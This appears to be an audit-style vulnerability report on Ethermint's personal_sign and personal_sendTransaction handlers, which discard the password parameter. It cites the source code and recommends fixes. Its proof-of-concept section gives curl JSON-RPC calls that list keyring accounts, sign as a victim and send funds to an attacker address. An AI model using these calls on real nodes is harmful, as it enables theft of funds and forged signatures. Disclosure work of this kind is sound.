### Title
Password Parameter Silently Discarded in `personal_sign` and `personal_sendTransaction` — Authentication Bypass Enabling Unauthorized Transaction Signing - (File: `rpc/namespaces/ethereum/personal/api.go`)

---

### Summary

The `personal_sign` and `personal_sendTransaction` JSON-RPC handlers accept a `password` parameter per the Ethereum `personal_` namespace specification, but both handlers silently discard it using the blank identifier `_`. Any caller with access to the JSON-RPC endpoint can sign arbitrary messages or broadcast transactions from any account held in the node's keyring without knowing the account password.

---

### Finding Description

The `personal_` namespace in Ethereum's JSON-RPC spec requires a password to authenticate key usage before signing. Ethermint implements these handlers but drops the password entirely:

**`personal_sign`** — the 4th parameter is discarded:

```go
func (api *PrivateAccountAPI) Sign(_ context.Context, data hexutil.Bytes, addr common.Address, _ string) (hexutil.Bytes, error) {
    api.logger.Debug("personal_sign", "data", data, "address", addr.String())
    return api.backend.Sign(addr, data)
}
```

The comment above the function explicitly states *"The key used to calculate the signature is decrypted with the given password"*, but the password is never forwarded to `backend.Sign`. [1](#0-0) 

**`personal_sendTransaction`** — the 3rd parameter (password) is discarded:

```go
func (api *PrivateAccountAPI) SendTransaction(_ context.Context, args evmtypes.TransactionArgs, _ string) (common.Hash, error) {
    api.logger.Debug("personal_sendTransaction", "address", args.To.String())
    return api.backend.SendTransaction(args)
}
```

The comment states *"If the given password isn't able to decrypt the key it fails"*, but no password check is performed. [2](#0-1) 

`backend.Sign` and `backend.SendTransaction` sign directly via `clientCtx.Keyring.SignByAddress` and `msg.Sign(signer, b.clientCtx.Keyring)` respectively, with no password gate: [3](#0-2) [4](#0-3) 

Additionally, `personal_unlockAccount` always returns `false, nil` without error, meaning the lock/unlock lifecycle that is supposed to gate signing is entirely non-functional: [5](#0-4) 

---

### Impact Explanation

Any caller with network access to the `personal_` JSON-RPC endpoint can:

1. Call `personal_sign` with any `addr` present in the node's keyring and any arbitrary `data`, receiving a valid ECDSA signature — without supplying the correct password.
2. Call `personal_sendTransaction` specifying `from` as any address in the node's keyring, causing the node to sign and broadcast a fully valid Ethereum transaction — without supplying the correct password.

This is a **signer verification bypass**: the password authentication layer mandated by the `personal_` spec is absent. An attacker who can reach the JSON-RPC port (e.g., a misconfigured public-facing node, a co-tenant on the same host, or a process with localhost access) can drain funds from any account the node manages, or forge signed messages on behalf of those accounts.

This maps to the allowed High impact: *"Ethereum transaction... signer verification bypass enabling... unauthorized account/code mutation."*

---

### Likelihood Explanation

- The `personal_` namespace is explicitly registered and served by Ethermint nodes that enable it (common in development and some production deployments).
- No exploit complexity is required beyond a standard JSON-RPC call — no brute force, no cryptographic attack.
- The attacker only needs network reachability to the JSON-RPC port and knowledge of an address in the keyring (obtainable via `personal_listAccounts` or `eth_accounts`).
- The vulnerability is unconditional: every call to `personal_sign` or `personal_sendTransaction` bypasses the password check.

---

### Recommendation

- **Short term**: Forward the `password` parameter from `Sign` and `SendTransaction` in `personal/api.go` to the backend, and implement password-based key decryption before signing. At minimum, reject calls with an empty or incorrect password rather than silently ignoring it.
- **Long term**: Implement the full `personal_unlockAccount` / `personal_lockAccount` lifecycle so that keys are only accessible for signing during an explicitly unlocked window authenticated by the correct password, matching the Ethereum `personal_` spec semantics.

---

### Proof of Concept

```bash
# 1. Discover accounts in the keyring (no auth required)
curl -X POST http://<node>:8545 \
  -H "Content-Type: application/json" \
  -d '{"jsonrpc":"2.0","method":"personal_listAccounts","params":[],"id":1}'
# Returns: ["0xVICTIM_ADDRESS"]

# 2. Sign arbitrary data as the victim — wrong password accepted silently
curl -X POST http://<node>:8545 \
  -H "Content-Type: application/json" \
  -d '{"jsonrpc":"2.0","method":"personal_sign","params":["0xdeadbeef","0xVICTIM_ADDRESS","WRONG_PASSWORD"],"id":2}'
# Returns: valid 65-byte ECDSA signature

# 3. Send a transaction from the victim — wrong password accepted silently
curl -X POST http://<node>:8545 \
  -H "Content-Type: application/json" \
  -d '{"jsonrpc":"2.0","method":"personal_sendTransaction","params":[{"from":"0xVICTIM_ADDRESS","to":"0xATTACKER","value":"0xDE0B6B3A7640000"},"WRONG_PASSWORD"],"id":3}'
# Returns: transaction hash — funds transferred without password verification
```

The password `"WRONG_PASSWORD"` is accepted because it is discarded at line 145 (`_ string`) and line 131 (`_ string`) of `rpc/namespaces/ethereum/personal/api.go` before any authentication check is performed. [6](#0-5) [7](#0-6)

### Citations

**File:** rpc/namespaces/ethereum/personal/api.go (L119-126)
```go
// UnlockAccount will unlock the account associated with the given address with
// the given password for duration seconds. If duration is nil it will use a
// default of 300 seconds. It returns an indication if the account was unlocked.
func (api *PrivateAccountAPI) UnlockAccount(_ context.Context, addr common.Address, _ string, _ *uint64) (bool, error) {
	api.logger.Debug("personal_unlockAccount", "address", addr.String())
	// TODO: Not supported. See underlying issue  https://github.com/99designs/keyring/issues/85
	return false, nil
}
```

**File:** rpc/namespaces/ethereum/personal/api.go (L128-134)
```go
// SendTransaction will create a transaction from the given arguments and
// tries to sign it with the key associated with args.To. If the given password isn't
// able to decrypt the key it fails.
func (api *PrivateAccountAPI) SendTransaction(_ context.Context, args evmtypes.TransactionArgs, _ string) (common.Hash, error) {
	api.logger.Debug("personal_sendTransaction", "address", args.To.String())
	return api.backend.SendTransaction(args)
}
```

**File:** rpc/namespaces/ethereum/personal/api.go (L136-148)
```go
// Sign calculates an Ethereum ECDSA signature for:
// keccak256("\x19Ethereum Signed Message:\n" + len(message) + message))
//
// Note, the produced signature conforms to the secp256k1 curve R, S and V values,
// where the V value will be 27 or 28 for legacy reasons.
//
// The key used to calculate the signature is decrypted with the given password.
//
// https://github.com/ethereum/go-ethereum/wiki/Management-APIs#personal_sign
func (api *PrivateAccountAPI) Sign(_ context.Context, data hexutil.Bytes, addr common.Address, _ string) (hexutil.Bytes, error) {
	api.logger.Debug("personal_sign", "data", data, "address", addr.String())
	return api.backend.Sign(addr, data)
}
```

**File:** rpc/backend/sign_tx.go (L37-79)
```go
// SendTransaction sends transaction based on received args using Node's key to sign it
func (b *Backend) SendTransaction(args evmtypes.TransactionArgs) (common.Hash, error) {
	// Look up the wallet containing the requested signer
	_, err := b.clientCtx.Keyring.KeyByAddress(sdk.AccAddress(args.GetFrom().Bytes()))
	if err != nil {
		b.logger.Error("failed to find key in keyring", "address", args.GetFrom(), "error", err.Error())
		return common.Hash{}, fmt.Errorf("failed to find key in the node's keyring; %s; %s", keystore.ErrNoMatch, err.Error())
	}

	if args.ChainID != nil && (b.chainID).Cmp((*big.Int)(args.ChainID)) != 0 {
		return common.Hash{}, fmt.Errorf("chainId does not match node's (have=%v, want=%v)", args.ChainID, (*hexutil.Big)(b.chainID))
	}

	args, err = b.SetTxDefaults(args)
	if err != nil {
		return common.Hash{}, err
	}

	msg := args.ToTransaction()
	if err := msg.ValidateBasic(); err != nil {
		b.logger.Debug("tx failed basic validation", "error", err.Error())
		return common.Hash{}, err
	}

	bn, err := b.BlockNumber()
	if err != nil {
		b.logger.Debug("failed to fetch latest block number", "error", err.Error())
		return common.Hash{}, err
	}

	header, err := b.CurrentHeader()
	if err != nil {
		b.logger.Debug("failed to fetch latest block header", "error", err.Error())
		return common.Hash{}, err
	}

	signer := ethtypes.MakeSigner(b.ChainConfig(), new(big.Int).SetUint64(uint64(bn)), header.Time)

	// Sign transaction
	if err := msg.Sign(signer, b.clientCtx.Keyring); err != nil {
		b.logger.Debug("failed to sign tx", "error", err.Error())
		return common.Hash{}, err
	}
```

**File:** rpc/backend/sign_tx.go (L129-148)
```go
func (b *Backend) Sign(address common.Address, data hexutil.Bytes) (hexutil.Bytes, error) {
	from := sdk.AccAddress(address.Bytes())

	_, err := b.clientCtx.Keyring.KeyByAddress(from)
	if err != nil {
		b.logger.Error("failed to find key in keyring", "address", address.String())
		return nil, fmt.Errorf("%s; %s", keystore.ErrNoMatch, err.Error())
	}

	// Apply EIP-191 signed-message prefix to domain-separate personal
	// signatures from transaction signatures (matching Geth's eth_sign).
	signature, _, err := b.clientCtx.Keyring.SignByAddress(from, accounts.TextHash(data), signingtypes.SignMode_SIGN_MODE_TEXTUAL)
	if err != nil {
		b.logger.Error("keyring.SignByAddress failed", "address", address.Hex())
		return nil, err
	}

	signature[crypto.RecoveryIDOffset] += 27 // Transform V from 0/1 to 27/28 according to the yellow paper
	return signature, nil
}
```
